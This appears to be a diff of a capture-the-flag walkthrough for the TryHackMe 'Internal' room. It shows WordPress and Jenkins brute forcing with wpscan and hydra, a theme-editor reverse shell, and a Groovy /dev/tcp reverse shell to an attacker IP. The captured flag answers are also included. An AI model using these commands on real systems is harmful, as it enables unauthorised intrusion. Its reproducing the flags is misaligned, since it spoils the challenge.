@@ -27,7 +27,6 @@ Additionally, the client has provided the following scope allowances:
 
 I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.
 
-
 Note - this room can be completed without Metasploit
 
 **Writeups will not be accepted for this room.**
@@ -35,8 +34,6 @@ Note - this room can be completed without Metasploit
 ### Deploy and Engage the Client Environment 
 
  Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.
-
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -87,7 +84,6 @@ PING internal.thm (10.10.97.105) 56(84) bytes of data.
 3 packets transmitted, 3 received, 0% packet loss, time 2004ms
 rtt min/avg/max/mdev = 196.600/201.695/209.705/5.733 ms
 
-
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O internal.thm
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 11:52 EDT
@@ -128,7 +124,6 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 32.92 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O internal.thm
-
 
 ┌──(kali㉿kali)-[~]
 └─$ feroxbuster --url http://internal.thm -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
@@ -181,7 +176,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 wordpress enumeration
 
 Browsing /blog confirms our assumption, this is a Wordpress blog. Let’s enumerate the users with wpscan: 
-
 
 ┌──(kali㉿kali)-[~]
 └─$ wpscan --url http://internal.thm/blog -e u                             
@@ -281,7 +275,6 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:16
 
 According to WPScan, the only user is admin. Let’s try to brute force the password, using the bruteforce feature of WPScan: 
-
 
 ┌──(kali㉿kali)-[~]
 └─$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
@@ -392,11 +385,9 @@ In the web interface, go to “Appearance > Theme Editor > 404.php” and replac
 
 Open a listener (rlwrap nc -nlvp 4444) and call the template (http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php). 
 
-
 internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 
 rev shell
-
 
 ┌──(kali㉿kali)-[~]
 └─$ rlwrap nc -nlvp 4444                                
@@ -525,10 +516,7 @@ aubreanna@internal:/tmp$ ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
 [1] 2229
 aubreanna@internal:/tmp$ ./socat: error while loading shared libraries: libssl.so.3: cannot open shared object file: No such file or directory
 
-
 [1]+  Exit 127                ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80
-
-
 
 aubreanna@internal:/tmp$ ifconfig
 ifconfig
@@ -592,14 +580,12 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
 
   => There is 1 zombie process.
 
-
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
 
 0 packages can be updated.
 0 updates are security updates.
-
 
 Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
 
@@ -612,7 +598,6 @@ and can see jenkins login
 using burpsuite and hydra
 
 or inspecting page network
-
 
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 6767 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
@@ -642,7 +627,6 @@ Now we have Jenkins password. Use it login and click on “manage jenkins” and
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.81.220/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-
 
 priv esc
 
@@ -714,23 +698,12 @@ drwxr-xr-x  3 root root 4096 Aug  3  2020 snap
 root@internal:~# cat root.txt
 THM{d0ck3r_d3str0y3r}
 
-
 ```
-
-![[Pasted image 20220928112542.png]]
-
-![[Pasted image 20220928114706.png]]
-
 
 User.txt Flag
 *THM{int3rna1_fl4g_1}*
 
-
-
-
 Root.txt Flag
 *THM{d0ck3r_d3str0y3r}*
-
-
 
 [[Relevant]]
